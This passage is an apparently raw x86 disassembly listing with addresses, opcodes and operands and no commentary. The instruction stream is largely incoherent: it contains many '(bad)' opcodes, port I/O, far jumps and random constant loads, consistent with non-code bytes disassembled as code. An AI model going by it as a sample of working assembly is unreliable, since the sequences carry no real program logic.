  413d98:	sub    edi,DWORD PTR [ecx-0x86d912f]
  413d9e:	push   cs
  413d9f:	aaa    
  413da0:	pop    ecx
  413da1:	sbb    BYTE PTR [edi+0x2423362a],0x7f
  413da8:	in     al,dx
  413da9:	shr    DWORD PTR [ecx-0x43],0xc
  413dad:	fst    st(7)
  413daf:	inc    edx
  413db0:	icebp  
  413db1:	daa    
  413db2:	test   BYTE PTR [eax-0x7c3b5c30],ch
  413db8:	fmul   DWORD PTR [edx+ebp*1+0x40]
  413dbc:	out    dx,eax
  413dbd:	psllq  mm1,mm4
  413dc0:	dec    eax
  413dc1:	lock or eax,0xa8b9991d
  413dc7:	xchg   BYTE PTR [edi],bh
  413dc9:	iret   
  413dca:	cmp    esi,DWORD PTR [eax-0x61a2db7b]
  413dd0:	in     al,0x35
  413dd2:	outs   dx,BYTE PTR ds:[esi]
  413dd3:	push   0xffffff82
  413dd5:	movnti DWORD PTR [ebx+esi*4-0x9],edx
  413dda:	repnz mov dl,0x30
  413ddd:	fcmovu st,st(4)
  413ddf:	mov    BYTE PTR [edi-0x54],dh
  413de2:	stos   DWORD PTR es:[edi],eax
  413de3:	or     bl,bh
  413de5:	mov    dl,0x2b
  413de7:	(bad)  
  413de9:	jp     0x413e59
  413deb:	lock (bad) 
  413ded:	lods   al,BYTE PTR ds:[esi]
  413dee:	jl     0x413dc0
  413df0:	pop    eax
  413df1:	lock mov edi,0x54f22689
  413df7:	add    ah,BYTE PTR [edx+0x48]
  413dfa:	lods   eax,DWORD PTR ds:[esi]
  413dfb:	test   DWORD PTR [ebx],esp
  413dfd:	es pop ebp
  413e00:	jbe    0x413e62
  413e02:	neg    BYTE PTR ds:0x6e702040
  413e08:	leave  
  413e09:	out    dx,eax
  413e0a:	test   DWORD PTR [edi-0x77],ebp
  413e0d:	inc    edx
  413e0e:	shl    eax,1
  413e10:	mov    fs,WORD PTR [esi-0x308590b8]
  413e16:	adc    dl,dh
  413e18:	fmul   QWORD PTR [eax+0x646744f7]
  413e1e:	mov    bl,0xe5
  413e20:	je     0x413e04
  413e22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e23:	adc    DWORD PTR [edi],ebp
  413e25:	fsub   st(4),st
  413e27:	inc    edi
  413e28:	push   cs
  413e29:	mov    ?,esp
  413e2b:	push   cs
  413e2c:	mov    ebp,0x9593543d
  413e31:	sub    ebx,DWORD PTR ds:0xab3f1335
  413e37:	xchg   DWORD PTR [ebx],esp
  413e39:	mov    eax,ds:0xe4fdc1f2
  413e3e:	xchg   BYTE PTR [edi-0x4f],dh
  413e41:	into   
  413e42:	retf   
  413e43:	mov    bh,0xd5
  413e45:	inc    edx
  413e46:	mov    eax,0xcb68a6e
  413e4b:	xchg   ecx,eax
  413e4c:	jg     0x413e66
  413e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e4f:	(bad)  
  413e51:	lea    ecx,[ebx]
  413e53:	adc    al,0xfb
  413e55:	ds inc eax
  413e57:	adc    eax,0x8bd1224e
  413e5c:	into   
  413e5d:	test   al,0x17
  413e5f:	dec    ecx
  413e60:	jnp    0x413ed7
  413e62:	call   0x467a6f12
  413e67:	aad    0x5a
  413e69:	pop    esp
  413e6a:	sub    al,0xa7
  413e6c:	ret    0x78f9
  413e6f:	loop   0x413e59
  413e71:	shl    BYTE PTR [ebx+0xe9e2267],1
  413e77:	sbb    al,0x85
  413e79:	inc    eax
  413e7a:	push   0x634a9937
  413e7f:	call   DWORD PTR [edi]
  413e81:	inc    edi
  413e82:	add    edx,DWORD PTR [edi-0x7c66ee17]
  413e88:	test   BYTE PTR [edi+0x6f4c398e],dh
  413e8e:	not    esi
  413e90:	clc    
  413e91:	outs   dx,DWORD PTR ds:[esi]
  413e92:	push   0x7cbce33d
  413e97:	ret    
  413e98:	popa   
  413e99:	test   BYTE PTR [ebp-0x71],bl
  413e9c:	xchg   ebx,eax
  413e9d:	mov    ds:0x35dbcc85,al
  413ea2:	mov    ds:0x9734189a,al
  413ea7:	int3   
  413ea8:	popa   
  413ea9:	adc    al,0xa3
  413eab:	pusha  
  413eac:	(bad)  [ebx]
  413eae:	rcl    al,0xd9
  413eb1:	mov    esp,0x522f917d
  413eb6:	lea    esp,[ebx+0x263555ee]
  413ebc:	push   esi
  413ebd:	sub    al,0xf4
  413ebf:	pop    eax
  413ec0:	sub    ebp,ebx
  413ec2:	push   esp
  413ec3:	ret    0x8c86
  413ec6:	add    BYTE PTR ds:0x4ec243b8,bh
  413ecc:	and    BYTE PTR fs:[ebp-0x5931632f],bh
  413ed3:	mov    eax,ds:0xeaee47dc
  413ed8:	out    0x9f,al
  413eda:	dec    ecx
  413edb:	cmp    DWORD PTR [ecx],edi
  413edd:	jle    0x413f58
  413edf:	xor    edx,edx
  413ee1:	adc    eax,0xa7ef9eef
  413ee6:	pop    ds
  413ee7:	ins    BYTE PTR es:[edi],dx
  413ee8:	pop    ss
  413ee9:	ret    
  413eea:	mov    cl,0x28
  413eec:	daa    
  413eed:	adc    al,0xb0
  413eef:	inc    edi
  413ef0:	adc    BYTE PTR [ebp-0x341f911c],dl
  413ef6:	mul    BYTE PTR [ebx]
  413ef8:	mov    ds:0x35b5112a,al
  413efd:	out    0xc9,al
  413eff:	xor    esp,DWORD PTR [esi-0x30dde79a]
  413f05:	(bad)  
  413f06:	sub    BYTE PTR cs:[ebp+0x3],ch
  413f0a:	jp     0x413f36
  413f0c:	mov    ah,BYTE PTR [ecx-0x64737b1b]
  413f12:	icebp  
  413f13:	test   al,0xd
  413f15:	push   ss
  413f16:	js     0x413f8e
  413f18:	lds    esp,FWORD PTR [edi-0x5570e189]
  413f1e:	inc    esi
  413f1f:	repnz xor dh,BYTE PTR [ebp-0x3a]
  413f23:	mov    ds:0x6a436dda,al
  413f28:	arpl   WORD PTR [ecx-0x30],bx
  413f2b:	pinsrw mm4,WORD PTR [ebp+0x10],0x5c
  413f30:	fdivp  st(4),st
  413f32:	and    DWORD PTR [edx-0x56058016],0xdb293ad6
  413f3c:	test   al,0xdb
  413f3e:	sbb    al,0xb3
  413f40:	scas   al,BYTE PTR es:[edi]
  413f41:	enter  0x54f7,0x4a
  413f45:	js     0x413fc4
  413f47:	cmp    al,ah
  413f49:	sti    
  413f4a:	icebp  
  413f4b:	jmp    0x413f10
  413f4d:	loopne 0x413f66
  413f4f:	in     al,0x61
  413f51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f52:	sbb    ecx,DWORD PTR [esi+0x360f2654]
  413f58:	inc    edx
  413f59:	cmp    eax,0xffffffe6
  413f5c:	jne    0x413f40
  413f5e:	xchg   edx,eax
  413f5f:	out    0xc1,al
  413f61:	or     al,0x36
  413f63:	xchg   edi,eax
  413f64:	test   al,0x77
  413f66:	(bad)  [ebx+0x64]
  413f69:	pusha  
  413f6a:	rol    bl,0xb2
  413f6d:	cmp    cl,bl
  413f6f:	sub    al,0x2f
  413f71:	sbb    al,bh
  413f73:	out    dx,eax
  413f74:	aaa    
  413f75:	data16 es sbb al,0x36
  413f79:	jae    0x413fe8
  413f7b:	int3   
  413f7c:	retf   0x5973
  413f7f:	in     al,0x4f
  413f81:	out    dx,al
  413f82:	sbb    DWORD PTR [ebx+0x6a408927],esp
  413f88:	sbb    ebx,DWORD PTR [eax-0x65cfb4b4]
  413f8e:	pop    ds
  413f8f:	mov    es,WORD PTR [eax+0x5fac73f1]
  413f95:	gs pop ebx
  413f97:	bound  edi,QWORD PTR [esi+0x36]
  413f9a:	sbb    al,0xe5
  413f9c:	cdq    
  413f9d:	ins    BYTE PTR es:[edi],dx
  413f9e:	adc    DWORD PTR [edi-0x227ebb94],ebx
  413fa4:	nop
  413fa5:	sub    esp,eax
  413fa7:	add    BYTE PTR [ecx],dl
  413fa9:	add    cl,BYTE PTR [esi-0x66b94b0a]
  413faf:	mov    dl,0x9f
  413fb1:	push   cs
  413fb2:	stos   DWORD PTR es:[edi],eax
  413fb3:	jo     0x413fa7
  413fb5:	jmp    0x413fb8
  413fb7:	ins    DWORD PTR es:[edi],dx
  413fb8:	sti    
  413fb9:	fisub  DWORD PTR [ecx-0x51]
  413fbc:	push   esi
  413fbd:	hlt    
  413fbe:	je     0x413f7b
  413fc0:	out    0x20,eax
  413fc2:	sub    DWORD PTR [ecx+0x57],esp
  413fc5:	cwde   
  413fc6:	in     al,dx
  413fc7:	mov    ecx,0xf4d1e499
  413fcc:	xchg   esi,eax
  413fcd:	add    ah,BYTE PTR [esi+0x13227b78]
  413fd3:	in     al,dx
  413fd4:	cmc    
  413fd5:	test   DWORD PTR [esi-0x4d],esi
  413fd8:	mov    WORD PTR [edx+eax*2+0x7dc9c90e],es
  413fdf:	mov    eax,0xbf67f0f2
  413fe4:	sub    edx,DWORD PTR [ebp-0x57]
  413fe7:	jle    0x414032
  413fe9:	mov    ds:0xfc456f16,eax
  413fee:	aaa    
  413fef:	leave  
  413ff0:	push   ebx
  413ff1:	iret   
  413ff2:	push   0xffffffa2
  413ff4:	or     bh,BYTE PTR [ebp+0x56cd9a57]
  413ffa:	push   cs
  413ffb:	add    eax,0x5559ffef
  414000:	xchg   ebp,eax
  414001:	sar    DWORD PTR [ecx-0x2bfedb76],1
  414007:	test   BYTE PTR [ebp-0x40abc388],bl
  41400d:	lods   al,BYTE PTR ds:[esi]
  41400e:	push   eax
  41400f:	cmp    DWORD PTR [eax-0x1970c627],esp
  414015:	push   esi
  414016:	push   cs
  414017:	js     0x413fc2
  414019:	(bad)  
  41401a:	xor    DWORD PTR [eax],ebx
  41401c:	pop    ds
  41401d:	push   edi
  41401e:	ret    
  41401f:	popf   
  414020:	mov    ah,0x31
  414022:	mov    edi,0xf0d81911
  414027:	add    BYTE PTR [edi],dl
  414029:	mov    esp,0xe8d1e4b7
  41402e:	inc    ebp
  41402f:	xchg   edi,eax
  414030:	push   eax
  414031:	add    eax,0x1662e9e6
  414036:	push   cs
  414037:	adc    eax,0x7cf51e38
  41403c:	adc    DWORD PTR [ebx],ecx
  41403e:	or     bh,dh
  414040:	stos   DWORD PTR es:[edi],eax
  414041:	pop    esp
  414042:	ret    
  414043:	out    dx,eax
  414044:	jnp    0x4140a6
  414046:	sbb    BYTE PTR [ebx-0x6f61a496],cl
  41404c:	cli    
  41404d:	pop    ss
  41404e:	add    al,0x1d
  414050:	repnz gs inc eax
  414053:	xor    eax,0x2f13006f
  414058:	xchg   edi,eax
  414059:	add    BYTE PTR [eax+0x57],al
  41405c:	sahf   
  41405d:	sbb    al,0xb2
  41405f:	mov    ch,0xf8
  414061:	leave  
  414062:	stos   BYTE PTR es:[edi],al
  414063:	loop   0x414070
  414065:	cmc    
  414066:	fidivr DWORD PTR [eax-0x39]
  414069:	dec    esi
  41406a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41406b:	das    
  41406c:	sbb    BYTE PTR [edx-0x10ea084a],0x88
  414073:	adc    al,0xa6
  414075:	sahf   
  414076:	inc    ebx
  414077:	mov    ah,0xd9
  414079:	daa    
  41407a:	shr    DWORD PTR [esi+0x38],1
  41407d:	pop    ebx
  41407e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  414080:	enter  0x97c5,0x64
  414084:	test   ecx,ebp
  414086:	inc    esp
  414087:	mov    bh,0x20
  414089:	gs push es
  41408b:	repnz into 
  41408d:	jge    0x414012
  41408f:	mov    ds:0xe8f5d90a,eax
  414094:	dec    ebp
  414095:	test   BYTE PTR [ecx],dh
  414097:	aas    
  414098:	xor    DWORD PTR [ebx+0x56],ebp
  41409b:	loopne 0x4140d2
  41409d:	clc    
  41409e:	sub    DWORD PTR ds:0x44dcb441,edx
  4140a4:	push   es
  4140a5:	mov    cl,0xf3
  4140a7:	inc    ebp
  4140a8:	imul   ebx,DWORD PTR [edi-0x4a],0x36
  4140ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140ad:	jnp    0x41407c
  4140af:	mov    eax,ds:0x123e3534
  4140b4:	jae    0x4140df
  4140b6:	add    dh,BYTE PTR [esp+eiz*8]
  4140b9:	cdq    
  4140ba:	adc    DWORD PTR [ebp-0x1847e1f5],esi
  4140c0:	shl    ch,cl
  4140c2:	mov    edx,0x19121848
  4140c7:	jge    0x4140e5
  4140c9:	scas   al,BYTE PTR es:[edi]
  4140ca:	xchg   ecx,eax
  4140cb:	cld    
  4140cc:	jns    0x414109
  4140ce:	out    dx,al
  4140cf:	mov    bh,0x54
  4140d1:	pop    eax
  4140d2:	pop    edi
  4140d3:	es push esi
  4140d5:	ret    0xc62d
  4140d8:	inc    eax
  4140d9:	ins    DWORD PTR es:[edi],dx
  4140da:	addr16 aad 0xd4
  4140dd:	dec    edi
  4140de:	idiv   BYTE PTR [ecx+0xd]
  4140e1:	outs   dx,DWORD PTR ds:[esi]
  4140e2:	imul   DWORD PTR [ecx+0x20622304]
  4140e8:	add    al,0xe5
  4140ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140eb:	idiv   BYTE PTR [edx]
  4140ed:	lds    ebx,FWORD PTR [ebx+0xf]
  4140f0:	pushf  
  4140f1:	pop    ecx
  4140f2:	sub    eax,0x64b0d057
  4140f7:	pusha  
  4140f8:	cdq    
  4140f9:	pop    esi
  4140fa:	test   BYTE PTR [ecx+edx*2+0x6d],dh
  4140fe:	and    DWORD PTR [esi],edi
  414100:	sub    esi,DWORD PTR [ecx-0x31]
  414103:	mov    ds:0xb5c7ae49,eax
  414108:	sbb    ah,ah
  41410a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41410b:	sbb    cl,bl
  41410d:	add    eax,0xe64bf891
  414112:	inc    edi
  414113:	loop   0x414127
  414115:	(bad)
  414118:	mov    BYTE PTR [edx-0x1c],bl
  41411b:	lock stos DWORD PTR es:[edi],eax
  41411d:	jmp    DWORD PTR [esi]
  41411f:	gs (bad) 
  414121:	fild   DWORD PTR [ecx-0x7e]
  414124:	es mov edx,0xa4a3f136
  41412a:	loopne 0x414149
  41412c:	sub    ch,bl
  41412e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41412f:	push   ebx
  414130:	sbb    BYTE PTR [ebx+0x49],dl
  414133:	js     0x414194
  414135:	aad    0x1b
  414137:	scas   al,BYTE PTR es:[edi]
  414138:	mov    BYTE PTR [eax-0x4b],cl
  41413b:	ret    0xe2a4
  41413e:	out    0xc3,eax
  414140:	pop    eax
  414141:	int3   
  414142:	xchg   ebx,eax
  414143:	sar    BYTE PTR [esi],1
  414145:	lock mov dh,0x8b
  414148:	push   edx
  414149:	stos   BYTE PTR es:[edi],al
  41414a:	sahf   
  41414b:	mov    ecx,0x13e53c1a
  414150:	loop   0x41417e
  414152:	add    eax,0x25250879
  414157:	stc    
  414158:	mov    dl,0xc7
  41415a:	test   eax,0xd69838ec
  41415f:	add    ecx,DWORD PTR [ebp+0x6d]
  414162:	es sub ecx,edi
  414165:	push   esp
  414166:	add    edx,DWORD PTR [ebp+0x126ef738]
  41416c:	and    DWORD PTR [eax+edx*2-0x31],eax
  414170:	pop    ds
  414171:	pushf  
  414172:	fstp   DWORD PTR [edx-0x73b647c3]
  414178:	test   al,0xc2
  41417a:	test   eax,0x642f17ac
  41417f:	push   cs
  414180:	push   0xbf2567d6
  414185:	xor    al,0x12
  414187:	and    ebp,DWORD PTR [ecx-0x201fd40e]
  41418d:	iret   
  41418e:	imul   eax,edx,0x9
  414191:	or     ecx,DWORD PTR [ebx+0x51]
  414194:	push   ecx
  414195:	sbb    bh,BYTE PTR [edi-0x18cb30d8]
  41419b:	push   cs
  41419c:	shr    bl,0x44
  41419f:	aad    0x32
  4141a1:	or     BYTE PTR [eax-0x2d5d6fda],0xc5
  4141a8:	and    al,0x6a
  4141aa:	rcl    eax,1
  4141ac:	sub    ecx,ebp
  4141ae:	or     esi,DWORD PTR [edi]
  4141b0:	sbb    DWORD PTR [edx],esp
  4141b2:	dec    ebp
  4141b3:	cmp    DWORD PTR [ecx+0x54cba8ff],ebp
  4141b9:	ja     0x4141b2
  4141bb:	cmc    
  4141bc:	cs mov edi,0x132ab715
  4141c2:	fcom   DWORD PTR [edx+0x78]
  4141c5:	cld    
  4141c6:	push   ecx
  4141c7:	cld    
  4141c8:	xlat   BYTE PTR ds:[ebx]
  4141c9:	pop    es
  4141ca:	fbstp  TBYTE PTR [esi+eiz*8-0x9]
  4141ce:	cmp    edx,eax
  4141d0:	fld    DWORD PTR [esp+esi*8]
  4141d3:	jno    0x414215
  4141d5:	out    dx,al
  4141d6:	(bad)  
  4141d7:	inc    ecx
  4141d8:	out    dx,al
  4141d9:	mov    edx,0xa6a15cfd
  4141df:	lods   al,BYTE PTR ds:[esi]
  4141e0:	sub    eax,0x6ba74806
  4141e5:	popf   
  4141e6:	mov    ah,0x3e
  4141e8:	mov    ds:0xf253c99d,eax
  4141ed:	out    0xaf,al
  4141ef:	and    esi,DWORD PTR [edx]
  4141f1:	std    
  4141f2:	int    0x7d
  4141f4:	mov    ebx,0xfc4251db
  4141f9:	fcmovnu st,st(6)
  4141fb:	mov    eax,esp
  4141fd:	imul   ebp,esi,0x3a2a68ce
  414203:	ret    0xd37
  414206:	(bad)
  414209:	fcomp  QWORD PTR es:[ebx+0x74]
  41420d:	push   0xb9267be0
  414212:	mov    eax,DWORD PTR [edi+0x3]
  414215:	pop    ecx
  414216:	pop    ds
  414217:	sti    
  414218:	mov    esp,0xfac2b422
  41421d:	xchg   edx,eax
  41421e:	mov    eax,0x5974d3ce
  414223:	mov    ecx,0x75edade2
  414228:	gs (bad) 
  41422b:	xor    esi,DWORD PTR [esi+0x222d2749]
  414231:	sub    eax,0x822e0811
  414236:	popa   
  414237:	jo     0x4141dd
  414239:	dec    esi
  41423a:	or     bh,bh
  41423c:	jmp    0x2876:0x898335fc
  414243:	mov    ?,WORD PTR [esp+edi*2+0x40]
  414247:	xor    edi,DWORD PTR ds:0x4a6e5e3e
  41424d:	scas   eax,DWORD PTR es:[edi]
  41424e:	sub    BYTE PTR [esi+edi*2+0x4accd813],dh
  414255:	popa   
  414256:	fidivr WORD PTR [ebp+0x54]
  414259:	hlt    
  41425a:	(bad)  
  41425b:	push   esi
  41425c:	and    eax,0xbe87cac4
  414261:	jbe    0x414226
  414263:	mov    WORD PTR [edx],gs
  414265:	mov    bh,0x40
  414267:	xchg   ebp,eax
  414268:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414269:	adc    DWORD PTR [edi-0x7c],0x82bb290b
  414270:	loopne 0x4141f2
  414272:	jns    0x414281
  414274:	(bad)  
  414275:	in     al,0xe1
  414277:	mov    dh,0xbe
  414279:	ins    DWORD PTR es:[edi],dx
  41427a:	jp     0x41426b
  41427c:	mov    edx,0x639a1c42
  414281:	test   BYTE PTR [edx-0x64],0xff
  414285:	xor    BYTE PTR [edi],dh
  414287:	aam    0x4
  414289:	addr16 dec edi
  41428b:	mov    ?,WORD PTR [esi-0x1e8776f7]
  414291:	cmp    BYTE PTR [esi+0x79d4d22a],0x89
  414298:	and    al,0xcc
  41429a:	add    ah,BYTE PTR [ebp-0x6740a91b]
  4142a0:	jmp    0x4142da
  4142a2:	or     al,0x4
  4142a4:	std    
  4142a5:	jp     0x414257
  4142a7:	cmp    ah,cl
  4142a9:	lahf   
  4142aa:	aas    
  4142ab:	imul   esi,ebp,0xe5fd9794
  4142b1:	pushf  
  4142b2:	push   ss
  4142b3:	adc    BYTE PTR [ebp+0x28],dl
  4142b6:	add    edx,DWORD PTR [edi]
  4142b8:	mov    edx,0xe12246ae
  4142bd:	into   
  4142be:	test   al,0xfd
  4142c0:	pop    edi
  4142c1:	and    al,0x74
  4142c3:	xchg   esi,eax
  4142c4:	mov    al,ch
  4142c6:	pushf  
  4142c7:	cmp    bh,cl
  4142c9:	out    0x98,eax
  4142cb:	push   esi
  4142cc:	push   eax
  4142cd:	add    cl,al
  4142cf:	mov    esi,0x38a2504
  4142d4:	lds    esi,FWORD PTR [eax+0x31]
  4142d7:	call   0x352bf227
  4142dc:	jne    0x4142ff
  4142de:	into   
  4142df:	sbb    DWORD PTR ds:0xf573,0x8e5ba4ef
  4142e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142e9:	jp     0x414346
  4142eb:	jle    0x41431b
  4142ed:	pop    ds
  4142ee:	rcr    BYTE PTR [esi+0x2054cee5],1
  4142f4:	loope  0x4142ca
  4142f6:	test   esi,esp
  4142f8:	mov    eax,ds:0x8b2cea76
  4142fd:	pop    es
  4142fe:	jp     0x414289
  414300:	xor    DWORD PTR [ebp-0xa],0x29
  414304:	(bad)  
  414305:	jns    0x4142f3
  414307:	loop   0x414312
  414309:	outs   dx,DWORD PTR ds:[esi]
  41430a:	jbe    0x414304
  41430c:	aam    0x83
  41430e:	lods   eax,DWORD PTR ds:[esi]
  41430f:	jo     0x414295
  414311:	ins    DWORD PTR es:[edi],dx
  414312:	sbb    edi,DWORD PTR [edx]
  414314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414315:	cmp    dl,BYTE PTR [edi-0x2d6ca4e]
  41431b:	adc    dh,al
  41431d:	xor    eax,DWORD PTR [esi]
  41431f:	repz sti 
  414321:	and    BYTE PTR [eax-0x21],cl
  414324:	adc    cl,cl
  414326:	cmp    bh,dh
  414328:	xor    esp,DWORD PTR [edx-0x28]
  41432b:	daa    
  41432c:	dec    esp
  41432d:	je     0x4142b9
  41432f:	retf   
  414330:	jmp    0xb17a7fbb
  414335:	addr16 sub eax,0x8a61bd82
  41433b:	inc    ecx
  41433c:	cmp    bl,BYTE PTR [esi-0x31]
  41433f:	pop    ds
  414340:	ja     0x4143a5
  414342:	inc    eax
  414343:	frstor [esi]
  414345:	sub    DWORD PTR [edx+0x3e],ecx
  414348:	int3   
  414349:	xor    BYTE PTR [edx-0x4a2aba2c],dh
  41434f:	or     al,ah
  414351:	cmp    cl,dh
  414353:	cli    
  414354:	mov    ecx,0xf5e887db
  414359:	ficomp WORD PTR [ebx]
  41435b:	jns    0x414322
  41435d:	daa    
  41435e:	loop   0x41438e
  414360:	mov    edi,0xbb2b1d13
  414365:	dec    ebp
  414366:	dec    ebx
  414367:	aam    0xe5
  414369:	imul   edx,DWORD PTR [eax],0xffffffd9
  41436c:	fwait
  41436d:	mov    edi,0x4871e05c
  414372:	xchg   esi,eax
  414373:	cmp    dl,ch
  414375:	ret    0x4108
  414378:	adc    al,0x23
  41437a:	mov    fs,edx
  41437c:	add    DWORD PTR [eax-0x12cc808],0x4041b06e
  414386:	and    ch,dl
  414388:	push   ss
  414389:	enter  0x510a,0x53
  41438d:	cs lahf 
  41438f:	mov    fs,WORD PTR [ebx+0x3217f182]
  414395:	ja     0x4143b4
  414397:	call   0x8540:0x1bc45d33
  41439e:	iret   
  41439f:	sbb    al,0x7a
  4143a1:	ss mov dh,0x16
  4143a4:	adc    dl,BYTE PTR ds:0x54478d4e
  4143aa:	adc    bl,bl
  4143ac:	stc    
  4143ad:	dec    ebp
  4143ae:	sub    DWORD PTR [eiz*8-0x326d749a],0xffffffb6
  4143b6:	inc    ebp
  4143b7:	mov    esp,0x9b776b6
  4143bc:	(bad)  
  4143bd:	hlt    
  4143be:	add    ebp,DWORD PTR [ecx-0x450b5915]
  4143c4:	sbb    eax,eax
  4143c6:	es adc si,sp
  4143ca:	add    dl,ah
  4143cc:	shl    dl,1
  4143ce:	mov    edx,0x655860d2
  4143d3:	xlat   BYTE PTR ds:[ebx]
  4143d4:	retf   0xee27
  4143d7:	in     al,0x6f
  4143d9:	out    dx,eax
  4143da:	push   edx
  4143db:	ins    DWORD PTR es:[edi],dx
  4143dc:	lods   eax,DWORD PTR ds:[esi]
  4143dd:	into   
  4143de:	xchg   ecx,eax
  4143df:	push   edi
  4143e0:	aas    
  4143e1:	or     ch,BYTE PTR [edx-0x3d]
  4143e4:	push   0x5df1b9bc
  4143e9:	lds    eax,FWORD PTR [edx]
  4143eb:	jmp    FWORD PTR [esi]
  4143ed:	lea    edx,ds:0xbfe555ec
  4143f3:	push   ds
  4143f4:	jle    0x414385
  4143f6:	scas   al,BYTE PTR es:[edi]
  4143f7:	ins    DWORD PTR es:[edi],dx
  4143f8:	lds    edi,FWORD PTR [eax]
  4143fa:	ret    0xb65f
  4143fd:	ja     0x4143ac
  4143ff:	adc    esp,ebp
  414401:	fwait
  414402:	ins    DWORD PTR es:[edi],dx
  414403:	jmp    0x42cd3c4f
  414408:	mov    BYTE PTR ds:0x4e67272,bh
  41440e:	pushf  
  41440f:	aaa    
  414410:	imul   ebp,edx,0x56
  414413:	sbb    al,0x15
  414415:	mul    bl
  414417:	sub    DWORD PTR [edi-0x7f756eaf],0x40
  41441e:	rcl    BYTE PTR [ebx],0xd5
  414421:	sub    edi,DWORD PTR [eax+ecx*8+0xd]
  414425:	sti    
  414426:	in     eax,dx
  414427:	push   es
  414428:	popf   
  414429:	inc    ebp
  41442a:	push   esi
  41442b:	mov    esi,0xc824aedc
  414430:	adc    BYTE PTR [eax-0x6d],0x6b
  414434:	jmp    0xe2ff1d4
  414439:	lea    esp,[esi-0x366d3c4]
  41443f:	in     al,dx
  414440:	fisttp DWORD PTR [ebx]
  414442:	loopne 0x414421
  414444:	or     DWORD PTR [ebp+0x579e1242],0x543e8191
  41444e:	ja     0x41441a
  414450:	(bad)
  414453:	push   edi
  414454:	mov    ss,WORD PTR [ebp-0x5c93b072]
  41445a:	pop    ebp
  41445b:	sbb    esp,DWORD PTR ds:[edi+0x68]
  41445f:	cld    
  414460:	or     DWORD PTR [bp+0x483b],ecx
  414465:	and    DWORD PTR [edx+0x7dd73a1d],0x5bc78529
  41446f:	jle    0x414490
  414471:	lahf   
  414472:	ror    DWORD PTR [ecx],0xcb
  414475:	or     BYTE PTR [ebx],bh
  414477:	aam    0x21
  414479:	clc    
  41447a:	ffree  st(3)
  41447c:	jo     0x414475
  41447e:	pop    ecx
  41447f:	mov    WORD PTR [edx-0x7],fs
  414482:	add    eax,0xb63b2252
  414487:	xor    bh,BYTE PTR [eax+0x39607cb6]
  41448d:	xchg   esi,eax
  41448e:	pop    DWORD PTR [edi-0x7]
  414491:	cmp    esp,DWORD PTR [ebx]
  414493:	fst    QWORD PTR [ebx]
  414495:	mov    dl,0x70
  414497:	dec    esi
  414498:	shl    DWORD PTR [ebx],0xc
  41449b:	sbb    BYTE PTR [ecx+0xe3cff54],0x84
  4144a2:	mov    esi,0x25418d7d
  4144a7:	xlat   BYTE PTR ds:[ebx]
  4144a8:	lock and al,0x21
  4144ab:	mul    DWORD PTR [esi]
  4144ad:	repz sti 
  4144af:	or     DWORD PTR [ecx+0xe],edi
  4144b2:	mov    edx,0xe7e91643
  4144b7:	xchg   edi,eax
  4144b8:	pop    edi
  4144b9:	(bad)  
  4144ba:	cli    
  4144bb:	hlt    
  4144bc:	test   DWORD PTR [edi+0x3d],ebx
  4144bf:	pop    ecx
  4144c0:	(bad)  
  4144c1:	cmp    BYTE PTR [esi+0x29],dl
  4144c4:	cli    
  4144c5:	js     0x41444e
  4144c7:	xor    edi,DWORD PTR [edx+0x34b1766f]
  4144cd:	fwait
  4144ce:	out    0x12,eax
  4144d0:	popa   
  4144d1:	ror    eax,1
  4144d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144d4:	xchg   esp,eax
  4144d5:	and    BYTE PTR [ebp+0x15],dh
  4144d8:	and    edi,DWORD PTR [ecx-0x115d5d29]
  4144de:	icebp  
  4144df:	dec    edx
  4144e0:	sub    ecx,ebx
  4144e2:	adc    DWORD PTR [edx],ebx
  4144e4:	ret    0x5cff
  4144e7:	dec    ebx
  4144e8:	imul   esi,DWORD PTR [eax-0x273278fd],0xdad35020
  4144f2:	cs cli 
  4144f4:	and    ah,BYTE PTR [esi]
  4144f6:	call   0xb9da30fc
  4144fb:	ror    DWORD PTR [ebx-0x34],1
  4144fe:	(bad)  
  4144ff:	fdivrp st(7),st
  414501:	xchg   edx,eax
  414502:	xchg   ebx,eax
  414503:	test   dl,dl
  414505:	xlat   BYTE PTR ds:[ebx]
  414506:	stc    
  414507:	mov    ds:0x913e0ffb,al
  41450c:	lds    ecx,FWORD PTR [ebp+0x6b]
  41450f:	add    dh,BYTE PTR [esi-0x56]
  414512:	or     al,0x96
  414514:	sbb    DWORD PTR [eax+0x6c4132e8],esp
  41451a:	int    0x82
  41451c:	test   bl,bh
  41451e:	cmp    BYTE PTR gs:[ebx-0x2f3c4d7e],0xa9
  414526:	push   esi
  414527:	xor    esp,edx
  414529:	aas    
  41452a:	inc    ebx
  41452b:	cli    
  41452c:	xchg   ebx,eax
  41452d:	lahf   
  41452e:	inc    ebp
  41452f:	cs aad 0x5e
  414532:	xlat   BYTE PTR ss:[ebx]
  414534:	dec    edx
  414535:	jo     0x414587
  414537:	call   0x2d12a174
  41453c:	pop    eax
  41453d:	retf   
  41453e:	mov    DWORD PTR [edx+0x5bc5bb],ecx
  414544:	pop    esi
  414545:	es pop ss
  414547:	cmc    
  414548:	mov    esp,0x977a08d
  41454d:	or     ah,BYTE PTR [edi]
  41454f:	fstp   QWORD PTR [ebp-0x427b8a7d]
  414555:	cwde   
  414556:	push   cs
  414557:	mov    ebp,0xf25e8f29
  41455c:	enter  0xe552,0x8a
  414560:	pop    eax
  414561:	mov    ds:0xd5b06957,eax
  414566:	repz arpl WORD PTR [ebx+0x1f],di
  41456a:	adc    al,BYTE PTR [edi+esi*2]
  41456d:	add    edx,esi
  41456f:	mov    ecx,0x813cfde3
  414574:	sbb    al,0x9e
  414576:	cli    
  414577:	pop    ecx
  414578:	ins    BYTE PTR es:[edi],dx
  414579:	shr    DWORD PTR [eax-0x4b],1
  41457c:	sub    DWORD PTR [ecx+0x36],edx
